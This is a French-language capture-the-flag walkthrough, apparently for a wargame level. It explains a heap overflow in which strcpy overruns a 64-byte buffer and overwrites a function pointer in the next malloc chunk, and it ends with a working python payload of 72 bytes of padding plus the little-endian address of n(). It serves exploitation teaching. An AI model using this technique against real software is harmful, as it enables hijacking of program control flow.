# Level 6 - Heap Overflow (écrasement de pointeur de fonction)

## Le bug en une phrase

`strcpy` copie `argv[1]` dans un buffer heap de 64 octets sans vérifier la taille →
si l'input dépasse 64 octets, on déborde sur le bloc malloc suivant qui contient un
pointeur de fonction → on écrase ce pointeur avec l'adresse de `n()`.

## La faille : strcpy sans limite

`strcpy` copie octet par octet jusqu'au `\0` de fin de chaîne, sans jamais vérifier
si ça rentre dans le buffer cible.

```
__dest = 64 octets       puVar1 = 4 octets
[ _ _ _ _ ... _ _ _ _ ][ adresse de m() ]

avec argv[1] = "A"*80 :
[ A A A A ... A A A A ][ A A A A A A A A ]
  ← 64 octets →          ← écrasé ! →
```

## Structure du heap (pourquoi 72 octets de padding ?)

Sur 32 bits, chaque bloc malloc a un **header de 8 octets** avant les données
(metadata glibc : prev_size + size).

```
heap :
[ header 8B ][ __dest 64B ][ header 8B ][ *puVar1 4B ]
               ↑ strcpy écrit ici          ↑ notre cible
```

Distance de `__dest` jusqu'à `*puVar1` :
```
64 (buffer) + 8 (header du 2e chunk) = 72 octets
```

→ les 72 premiers octets du payload = padding, le reste écrase `*puVar1`.

## Étape 1 : trouver l'adresse de n()

```bash
objdump -d level6 | grep n
```

Résultat :
```
08048454 <n>:
```

Adresse de `n()` = **0x08048454**

## Étape 2 : construire le payload

```
[padding 72 octets] + [adresse de n() en little-endian]
```

Little-endian de `0x08048454` → `\x54\x84\x04\x08`

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```